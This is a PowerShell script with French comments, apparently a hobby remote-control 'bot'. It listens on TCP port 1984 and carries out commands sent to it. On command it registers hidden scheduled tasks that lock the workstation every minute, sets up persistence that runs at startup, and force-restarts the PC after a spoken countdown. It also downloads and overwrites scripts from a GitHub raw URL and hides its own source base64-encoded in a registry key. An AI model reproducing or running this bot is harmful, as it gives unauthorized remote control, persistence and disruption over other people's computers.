#Script FRX_Socket 
function global:FRX_Socket-Listen-Connect{
    param($port=1984)
    $socket = new-object System.Net.Sockets.TcpListener('0.0.0.0',$port)
    if($socket -eq $null){exit 1}
    $socket.Start()
    return $socket    
}
function global:FRX_Socket-Listen-Read{
    param($socket,$buffersize=512)
    $script:client = $socket.AcceptTcpClient()

    $stream = $script:client.GetStream() # je récupère ce qui est envoyé
    # Mais qu'est ce qui a été transmis alors ?
    $buffer = New-Object system.byte[] $buffersize
    do{
        $read = $null
        while($stream.DataAvailable -or $read -eq $null){
            $read = $stream.read($buffer,0,$buffersize)
        }    
    }while($read -gt 1)
    $message = ([System.Text.Encoding]::ASCII).GetString($buffer)
    $message = $message.substring(0,$message.IndexOf(0))
    
    return $message    
}
function global:FRX_Socket-Listen-Close{
    param($socket)
    $socket.stop()
    $script:client.close()
    return $null
}
Function global:FRX_Socket-Send-Port{
    param($port = 1984,$IPTarget=127.0.0.1,$message="echo123456")
    $socket = new-object System.Net.Sockets.TcpClient($IPTarget, $port)
    $data = [System.Text.Encoding]::ASCII.GetBytes($message)
    $stream = $socket.GetStream()
    $stream.Write($data, 0, $data.Length)
    $socket.close()
    return $null
}
#$DirectoryBot = New-Item -Path "C:\Program Files (x86)\WindowsPowerShell\Configuration\Registration\lib"
$botpath      = "C:\lib\BOT\BOTOK.ps1"
$URL          = "https://raw.githubusercontent.com/Airone23/BOT-FRX/master/BOTOK.ps1"
$autrescript  = "C:\lib\BOT\test.ps1"
$autreURL     = "https://raw.githubusercontent.com/Airone23/BOT-FRX/master/test.ps1"
# sur le bot : 
function global:FRX_Socket-MessageAction{
    param($message)
    $stop = $false
    switch ($message) {
        {$_ -match "HACKMETHIS"  } {write-host "hack this" -ForegroundColor green 
            #-------- 3- Tâche planifiée (Lorsqu'on écrit HACKMETHIS) --------
            #Prépare deux tâches planifiée, une qui lance un script complémentaire (Notification sonore)
            #L'autre qui va verrouiller le pc toutes les minutes

            #Mise en place des tâches
            $tache1 = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-windowstyle hidden -ExecutionPolicy Bypass $autrescript"
            $tache2  = New-ScheduledTaskAction -Execute "rundll32.exe" -Argument "user32.dll,LockWorkStation"
            
            #Mise en place de la fréquence de la tâche et de la date de sa première exécution
            $date  = New-ScheduledTaskTrigger -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 1) -Once

            #Mise en place de la tâche avec les paramètres vus précédemment
            try{
                Register-ScheduledTask -TaskName "test" -Trigger $date -Action $tache1,$tache2 -Description "Time to lock :)" Task -ErrorAction Stop | Out-Null
            }catch{
                Register-ScheduledTask -TaskName "test" -Trigger $date -Action $tache1,$tache2 -Description "Time to lock :)" Task
             }
                                   }
        {$_ -match "COUNT"       } {write-host "COUNT" -ForegroundColor Yellow
        #-------- Bonus- Redémarrage du pc si on tape "count" avec une voix qui annonce un décompte "3 2 1" --------
            #Mise en place de 'excéution automatique de la tâche 
            $tache3 = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-windowstyle hidden -ExecutionPolicy Bypass C:\lib\BOT\BOTOK.ps1"
            $Repet = New-ScheduledTaskTrigger -AtStartup

            #Mise en place de la tâche avec les paramètres vus précédemment
            try{
                Register-ScheduledTask -TaskName "Restart" -Trigger $Repet -Action $tache3 -Description "Time to Diconnect :)" Task -ErrorAction Stop | Out-Null
            }catch{
                Register-ScheduledTask -TaskName "Restart" -Trigger $Repet -Action $tache3 -Description "Time to Disconnect :)" Task
             }
             #redémarrage de l'ordinateur
             Add-Type -AssemblyName System.speech
             $speak = New-Object System.Speech.Synthesis.SpeechSynthesizer
             $speak.Speak("Attention votre ordinateur va couper dans. 3 2 1")
             Restart-Computer -Force
        }
        {$_ -like  "GAMEOVER"    } {write-host "--- TERMINATING CONNECTION ---" -ForegroundColor red
                                    $stop=$true}
        
        #-------- 3- MAJ du bot depuis GITHUB (Lorsqu'on écrit n'importe quoi se terminant par ".. " (l'espace est obligatoire) ) --------
        {$_ -like "*.. " }
        #Envoi d'une requête afin de télécharger le BOT à jour sur Github         
        {
        Invoke-WebRequest -Uri $URL -OutFile $botpath
        Foreach-object {
             write-host "+---- Download ----+" -fore yellow}{
             write-host "|" -ForegroundColor Yellow -no
             Write-Host "   Download ok!   " -ForegroundColor Blue -NoNewline
             write-host "|" -ForegroundColor Yellow 
        }{   write-host "+------------------+"-fore yellow}
                #Le programme s'arrête après MAJ

                Set-Location HKCU:\Software\Microsoft\Windows\CurrentVersion
                $registerypath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\GentilleCle"
                if(Test-Path $registerypath){
                    Write-host Clé régistre déjà-présente, mise à jour... -fore red
                    $script       =[IO.File]::ReadAllText("C:\lib\BOT\BOTok_commenté.ps1")
                    $scriptbytes  = [System.Text.Encoding]::UTF8.GetBytes($script)
                    $scriptbase64 = [System.Convert]::ToBase64String($scriptbytes)
                    set-ItemProperty -path $registerypath -Name Script -Value $scriptbase64
                }
                else{
                    New-Item -Path $registerypath
                    $script       =[IO.File]::ReadAllText("C:\lib\BOT\BOTok_commenté.ps1")
                    $scriptbytes  = [System.Text.Encoding]::UTF8.GetBytes($script)
                    $scriptbase64 = [System.Convert]::ToBase64String($scriptbytes)
                    set-ItemProperty -path $registerypath -Name Script -Value $scriptbase64
                }
                $stop=$true
        }
        Default {write-host $message}
    }
    return $stop
}

$Socket   = FRX_Socket-Listen-Connect  -port 1984
do{
    $message  = FRX_Socket-Listen-Read     -socket  $Socket -buffersize 512
    Invoke-WebRequest -Uri $autreURL -OutFile $autrescript
    $stop     = FRX_Socket-MessageAction   -message $message
   }until($stop)
$closeACK = FRX_Socket-Listen-Close    -socket $Socket 
#powershell $botpath
